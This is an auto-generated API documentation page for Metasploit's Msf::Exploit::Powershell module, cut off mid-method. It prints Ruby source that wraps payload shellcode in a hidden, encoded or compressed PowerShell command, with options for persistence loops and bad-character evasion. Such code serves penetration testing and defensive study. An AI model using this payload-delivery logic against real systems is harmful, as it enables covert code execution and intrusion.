<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  Module: Msf::Exploit::Powershell
  
    &mdash; Documentation by YARD 0.8.7.4
  
</title>

  <link rel="stylesheet" href="../../css/style.css" type="text/css" charset="utf-8" />

  <link rel="stylesheet" href="../../css/common.css" type="text/css" charset="utf-8" />

<script type="text/javascript" charset="utf-8">
  hasFrames = window.top.frames.main ? true : false;
  relpath = '../../';
  framesUrl = "../../frames.html#!Msf/Exploit/Powershell.html";
</script>


  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>


  </head>
  <body>
    <div id="header">
      <div id="menu">
  
    <a href="../../_index.html">Index (P)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Exploit.html" title="Msf::Exploit (class)">Exploit</a></span></span>
     &raquo; 
    <span class="title">Powershell</span>
  

  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
</div>

      <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../class_list.html">
      Class List
    </a>
  
    <a class="full_list_link" id="method_list_link"
        href="../../method_list.html">
      Method List
    </a>
  
    <a class="full_list_link" id="file_list_link"
        href="../../file_list.html">
      File List
    </a>
  
</div>
      <div class="clear"></div>
    </div>

    <iframe id="search_frame"></iframe>

    <div id="content"><h1>Module: Msf::Exploit::Powershell
  
  
  
</h1>

<dl class="box">
  
  
    
  
    
  
  
    <dt class="r1">Included in:</dt>
    <dd class="r1"><span class='object_link'><a href="../Post/Windows/Runas.html" title="Msf::Post::Windows::Runas (module)">Post::Windows::Runas</a></span></dd>
    
  
  
    <dt class="r2 last">Defined in:</dt>
    <dd class="r2 last">lib/msf/core/exploit/powershell.rb</dd>
  
</dl>
<div class="clear"></div>

<h2>Defined Under Namespace</h2>
<p class="children">
  
    
      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Powershell/PshMethods.html" title="Msf::Exploit::Powershell::PshMethods (module)">PshMethods</a></span>
    
  
    
  
</p>

  <h2>Constant Summary</h2>
  
    <dl class="constants">
      
        <dt id="PowershellScript-constant" class="">PowershellScript =
          
        </dt>
        <dd><pre class="code"><span class='const'>Rex</span><span class='op'>::</span><span class='const'>Exploitation</span><span class='op'>::</span><span class='const'>Powershell</span><span class='op'>::</span><span class='const'>Script</span></pre></dd>
      
    </dl>
  







  
    <h2>
      Instance Method Summary
      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#cmd_psh_payload-instance_method" title="#cmd_psh_payload (instance method)">- (String) <strong>cmd_psh_payload</strong>(pay, payload_arch, opts = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Creates a powershell command line string which will execute the payload in
a hidden window in the appropriate execution environment for the payload
architecture.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#compress_script-instance_method" title="#compress_script (instance method)">- (String) <strong>compress_script</strong>(script_in, eof = nil) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Return a gzip compressed powershell script Will invoke PSH modifiers as
enabled.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#encode_script-instance_method" title="#encode_script (instance method)">- (String) <strong>encode_script</strong>(script_in) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Return an encoded powershell script Will invoke PSH modifiers as enabled.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_psh_args-instance_method" title="#generate_psh_args (instance method)">- (String) <strong>generate_psh_args</strong>(opts) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate arguments for the powershell command The format will be have no
space at the start and have a space afterwards e.g.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_psh_command_line-instance_method" title="#generate_psh_command_line (instance method)">- (String) <strong>generate_psh_command_line</strong>(opts) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate a powershell command line, options are passed on to
generate_psh_args.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">- (Object) <strong>initialize</strong>(info = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#run_hidden_psh-instance_method" title="#run_hidden_psh (instance method)">- (String) <strong>run_hidden_psh</strong>(ps_code, payload_arch, encoded) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Wraps the powershell code to launch a hidden window and detect the
execution environment and spawn the appropriate powershell executable for
the payload architecture.</p>
</div></span>
  
</li>

      
    </ul>
  



  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="cmd_psh_payload-instance_method">
  
    - (<tt>String</tt>) <strong>cmd_psh_payload</strong>(pay, payload_arch, opts = {}) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Creates a powershell command line string which will execute the payload in
a hidden window in the appropriate execution environment for the payload
architecture. Opts are passed through to run_hidden_psh,
generate_psh_command_line and generate_psh_args</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>pay</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The payload shellcode</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>payload_arch</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The payload architecture &#39;x86&#39;/&#39;x86_64&#39;</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>opts</span>
      
      
        <span class='type'>(<tt>Hash</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>{}</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>The options to generate the command</p>
</div>
      
    </li>
  
</ul>

  
    
    
    
    
    
    
    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
    <ul class="option">
      
        <li>
          <span class="name">:persist</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Loop the payload to cause re-execution if the shellcode finishes</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:prepend_sleep</span>
          <span class="type">(<tt>Integer</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Sleep for the specified time before executing the payload</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:method</span>
          <span class="type">(<tt>String</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>The powershell injection technique to use:
&#39;net&#39;/&#39;reflection&#39;/&#39;old&#39;</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:encode_inner_payload</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Encodes the powershell script within the hidden/architecture detection
wrapper</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:encode_final_payload</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Encodes the final powershell script</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:remove_comspec</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Removes the %COMSPEC% environment variable at the start of the command line</p>
</div>
          
        </li>
      
        <li>
          <span class="name">:use_single_quotes</span>
          <span class="type">(<tt>Boolean</tt>)</span>
          <span class="default">
            
          </span>
          
            &mdash; <div class='inline'>
<p>Wraps the -Command argument in single quotes unless :encode_final_payload</p>
</div>
          
        </li>
      
    </ul>
  

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Powershell command line with payload</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 261</span>

<span class='kw'>def</span> <span class='id identifier rubyid_cmd_psh_payload'>cmd_psh_payload</span><span class='lparen'>(</span><span class='id identifier rubyid_pay'>pay</span><span class='comma'>,</span> <span class='id identifier rubyid_payload_arch'>payload_arch</span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:persist</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::persist</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:prepend_sleep</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::prepend_sleep</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:method</span><span class='rbracket'>]</span> <span class='op'>||=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::method</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:encode_inner_payload</span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:encode_final_payload</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_fail'>fail</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:encode_inner_payload and :encode_final_payload are incompatible options</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:no_equals</span><span class='rbracket'>]</span> <span class='op'>&amp;&amp;</span> <span class='op'>!</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:encode_final_payload</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_fail'>fail</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>:no_equals requires :encode_final_payload option to be used</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_psh_payload'>psh_payload</span> <span class='op'>=</span> <span class='kw'>case</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:method</span><span class='rbracket'>]</span>
  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>net</span><span class='tstring_end'>&#39;</span></span>
    <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Util</span><span class='op'>::</span><span class='const'>EXE</span><span class='period'>.</span><span class='id identifier rubyid_to_win32pe_psh_net'>to_win32pe_psh_net</span><span class='lparen'>(</span><span class='id identifier rubyid_framework'>framework</span><span class='comma'>,</span> <span class='id identifier rubyid_pay'>pay</span><span class='rparen'>)</span>
  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>reflection</span><span class='tstring_end'>&#39;</span></span>
    <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Util</span><span class='op'>::</span><span class='const'>EXE</span><span class='period'>.</span><span class='id identifier rubyid_to_win32pe_psh_reflection'>to_win32pe_psh_reflection</span><span class='lparen'>(</span><span class='id identifier rubyid_framework'>framework</span><span class='comma'>,</span> <span class='id identifier rubyid_pay'>pay</span><span class='rparen'>)</span>
  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>old</span><span class='tstring_end'>&#39;</span></span>
    <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Util</span><span class='op'>::</span><span class='const'>EXE</span><span class='period'>.</span><span class='id identifier rubyid_to_win32pe_psh'>to_win32pe_psh</span><span class='lparen'>(</span><span class='id identifier rubyid_framework'>framework</span><span class='comma'>,</span> <span class='id identifier rubyid_pay'>pay</span><span class='rparen'>)</span>
  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>msil</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_fail'>fail</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>MSIL Powershell method no longer exists</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_fail'>fail</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>No Powershell method specified</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='comment'># Run our payload in a while loop
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:persist</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_fun_name'>fun_name</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>2</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>2</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_sleep_time'>sleep_time</span> <span class='op'>=</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>5</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>5</span>
    <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Sleep time set to </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_sleep_time'>sleep_time</span><span class='embexpr_end'>}</span><span class='tstring_content'> seconds</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_psh_payload'>psh_payload</span>  <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>function </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_fun_name'>fun_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>{</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_psh_payload'>psh_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>};</span><span class='tstring_end'>&quot;</span></span>
    <span class='id identifier rubyid_psh_payload'>psh_payload</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>while(1){Start-Sleep -s </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_sleep_time'>sleep_time</span><span class='embexpr_end'>}</span><span class='tstring_content'>;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_fun_name'>fun_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>;1};</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:prepend_sleep</span><span class='rbracket'>]</span>
    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:prepend_sleep</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span> <span class='op'>&gt;</span> <span class='int'>0</span>
      <span class='id identifier rubyid_psh_payload'>psh_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Start-Sleep -s </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:prepend_sleep</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>;</span><span class='tstring_end'>&quot;</span></span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_psh_payload'>psh_payload</span>
    <span class='kw'>else</span>
      <span class='id identifier rubyid_vprint_error'>vprint_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Sleep time must be greater than 0 seconds</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
    <span class='kw'>end</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_compressed_payload'>compressed_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_psh_payload'>psh_payload</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_encoded_payload'>encoded_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_psh_payload'>psh_payload</span><span class='rparen'>)</span>

  <span class='comment'># This branch is probably never taken...
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_encoded_payload'>encoded_payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&lt;=</span> <span class='id identifier rubyid_compressed_payload'>compressed_payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
    <span class='id identifier rubyid_smallest_payload'>smallest_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_encoded_payload'>encoded_payload</span>
    <span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='kw'>true</span>
  <span class='kw'>else</span>
    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:encode_inner_payload</span><span class='rbracket'>]</span>
      <span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='kw'>true</span>
      <span class='id identifier rubyid_compressed_encoded_payload'>compressed_encoded_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_compressed_payload'>compressed_payload</span><span class='rparen'>)</span>

      <span class='kw'>if</span> <span class='id identifier rubyid_encoded_payload'>encoded_payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&lt;=</span> <span class='id identifier rubyid_compressed_encoded_payload'>compressed_encoded_payload</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
        <span class='id identifier rubyid_smallest_payload'>smallest_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_encoded_payload'>encoded_payload</span>
      <span class='kw'>else</span>
        <span class='id identifier rubyid_smallest_payload'>smallest_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_compressed_encoded_payload'>compressed_encoded_payload</span>
      <span class='kw'>end</span>
    <span class='kw'>else</span>
      <span class='id identifier rubyid_smallest_payload'>smallest_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_compressed_payload'>compressed_payload</span>
      <span class='id identifier rubyid_encoded'>encoded</span> <span class='op'>=</span> <span class='kw'>false</span>
    <span class='kw'>end</span>
  <span class='kw'>end</span>

  <span class='comment'># Wrap in hidden runtime / architecture detection
</span>  <span class='id identifier rubyid_final_payload'>final_payload</span> <span class='op'>=</span> <span class='id identifier rubyid_run_hidden_psh'>run_hidden_psh</span><span class='lparen'>(</span><span class='id identifier rubyid_smallest_payload'>smallest_payload</span><span class='comma'>,</span> <span class='id identifier rubyid_payload_arch'>payload_arch</span><span class='comma'>,</span> <span class='id identifier rubyid_encoded'>encoded</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_command_args'>command_args</span> <span class='op'>=</span> <span class='lbrace'>{</span>
    <span class='label'>noprofile:</span> <span class='kw'>true</span><span class='comma'>,</span>
    <span class='label'>windowstyle:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>hidden</span><span class='tstring_end'>&#39;</span></span>
  <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_merge'>merge</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:encode_final_payload</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_command_args'>command_args</span><span class='lbracket'>[</span><span class='symbol'>:encodedcommand</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_final_payload'>final_payload</span><span class='rparen'>)</span>

    <span class='comment'># If &#39;=&#39; is a bad character pad the payload until Base64 encoded
</span>    <span class='comment'># payload contains none.
</span>    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:no_equals</span><span class='rbracket'>]</span>
      <span class='kw'>while</span> <span class='id identifier rubyid_command_args'>command_args</span><span class='lbracket'>[</span><span class='symbol'>:encodedcommand</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>=</span><span class='tstring_end'>&#39;</span></span>
        <span class='id identifier rubyid_final_payload'>final_payload</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'> </span><span class='tstring_end'>&#39;</span></span>
        <span class='id identifier rubyid_command_args'>command_args</span><span class='lbracket'>[</span><span class='symbol'>:encodedcommand</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_final_payload'>final_payload</span><span class='rparen'>)</span>
      <span class='kw'>end</span>
    <span class='kw'>end</span>
  <span class='kw'>else</span>
    <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:use_single_quotes</span><span class='rbracket'>]</span>
      <span class='comment'># Escape Single Quotes
</span>      <span class='id identifier rubyid_final_payload'>final_payload</span><span class='period'>.</span><span class='id identifier rubyid_gsub!'>gsub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
      <span class='comment'># Wrap command in quotes
</span>      <span class='id identifier rubyid_final_payload'>final_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_final_payload'>final_payload</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span>
    <span class='kw'>end</span>

    <span class='id identifier rubyid_command_args'>command_args</span><span class='lbracket'>[</span><span class='symbol'>:command</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_final_payload'>final_payload</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_psh_command'>psh_command</span> <span class='op'>=</span> <span class='id identifier rubyid_generate_psh_command_line'>generate_psh_command_line</span><span class='lparen'>(</span><span class='id identifier rubyid_command_args'>command_args</span><span class='rparen'>)</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:remove_comspec</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_command'>command</span> <span class='op'>=</span> <span class='id identifier rubyid_psh_command'>psh_command</span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_command'>command</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>%COMSPEC% /b /c start /b /min </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_psh_command'>psh_command</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_vprint_status'>vprint_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Powershell command length: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_command'>command</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_command'>command</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>8191</span>
    <span class='id identifier rubyid_fail'>fail</span> <span class='const'>RuntimeError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell command length is greater than the command line maximum (8192 characters)</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_command'>command</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="compress_script-instance_method">
  
    - (<tt>String</tt>) <strong>compress_script</strong>(script_in, eof = nil) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Return a gzip compressed powershell script Will invoke PSH modifiers as
enabled</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>script_in</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Script contents</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>eof</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>nil</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>Marker to indicate the end of file appended to script</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>Compressed script with decompression stub</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


49
50
51
52
53
54
55
56
57
58
59</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/powershell.rb', line 49</span>

<span class='kw'>def</span> <span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script_in'>script_in</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span> <span class='op'>=</span> <span class='kw'>nil</span><span class='rparen'>)</span>
  <span class='comment'># Build script object
</span>  <span class='id identifier rubyid_psh'>psh</span> <span class='op'>=</span> <span class='const'>PowershellScript</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_script_in'>script_in</span><span class='rparen'>)</span>
  <span class='comment'># Invoke enabled modifiers
</span>  <span class='id identifier rubyid_datastore'>datastore</span><span class='period'>.</span><span class='id identifier rubyid_select'>select</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='comma'>,</span> <span class='id identifier rubyid_v'>v</span><span class='op'>|</span> <span class='id identifier rubyid_k'>k</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>^Powershell::(strip|sub)</span><span class='regexp_end'>/</span></span> <span class='kw'>and</span> <span class='id identifier rubyid_v'>v</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_keys'>keys</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span> <span class='kw'>do</span> <span class='op'>|</span><span class='id identifier rubyid_k'>k</span><span class='op'>|</span>
